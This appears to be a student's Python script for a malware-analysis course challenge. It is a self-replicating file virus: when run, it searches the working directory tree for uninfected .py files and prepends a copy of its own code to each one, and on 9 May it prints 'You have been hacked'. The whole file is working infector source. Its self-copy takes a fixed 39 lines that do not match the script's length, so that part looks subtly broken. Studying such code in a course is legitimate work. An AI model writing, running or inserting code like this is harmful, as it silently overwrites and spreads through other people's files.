#!/usr/bin/python3
# Import libraries
import os
import datetime
# Script Name:                  ops-301d14_Challenge14.py 
# Date of latest revision:      12/14/2023
# Purpose:                      Malware Analysis
# Execution:			        python3 ops-301d14_Challenge14.py 
# Documentation     

SIGNATURE = "VIRUS"
# this is a function that targets files. and adds them to an array
def locate(path):
    # creates an empty array
    files_targeted = []
    # lists all dir in the given path and assigns them to the variable filelist
    filelist = os.listdir(path)
    # for loop to check every element in the above variable 
    for fname in filelist:
        # if statement to check if path is a dir with the given path/element
        if os.path.isdir(path+"/"+fname):
            # located the path/element and adds it to the files targeted array
            files_targeted.extend(locate(path+"/"+fname))
        elif fname[-3:] == ".py":
            # else if statement that checks if the last three index's char's are .py and if so checks assigns the variable infected with false 
            infected = False
            # opens the file with given path/element and checks each line in the file
            for line in open(path+"/"+fname):
                # if line has the str "VIRUS" in it then change the infected variable to True and break from the for loops
                if SIGNATURE in line:
                    infected = True
                    break
            # If infected equals false then add the file to the end of files targeted list
            if infected == False:
                files_targeted.append(path+"/"+fname)
    return files_targeted # returns the full list of files targeted with each file in the dir
# function to infect targeted files from the last function
def infect(files_targeted):
    # defines the variable virus with an open file command and giving the path to that file the absolute path __file__ 
    virus = open(os.path.abspath(__file__))
    # assigning an empty str to the variable virusstring
    virusstring = ""
    # for loop to check i and each line in the virus variable enumerated
    for i,line in enumerate(virus):
        # if the enumerated index is between 0 and 38 then add the line to the variable virusstring
        if 0 <= i < 39:
            virusstring += line
    # close the virus file 
    virus.close
    # for loop that checks each file in list files targeted
    for fname in files_targeted:
        # assigns the variable f with opening the file
        f = open(fname)
        # assigns the variable temp with the read property of variable f
        temp = f.read()
        # closes the file opened by f
        f.close()
        # assigns again the var f with opening the file fname with writing priveledges
        f = open(fname,"w")
        # writes the string virusstring and temp into the file fname opened by f
        f.write(virusstring + temp)
        # closes the file opened with f
        f.close()
# function detonate that will check if the date matches may 9th and if it does then prints to the screen "you have been hacked"
def detonate():
    if datetime.datetime.now().month == 5 and datetime.datetime.now().day == 9:
        print("You have been hacked")
# this assigns files targeted var with the function locate with parameters as the absolute path of the current dir
# the infect function is called with the new files targeted var as its parameters
# and the detonate function is called without needing parameters        
files_targeted = locate(os.path.abspath(""))
infect(files_targeted)
detonate()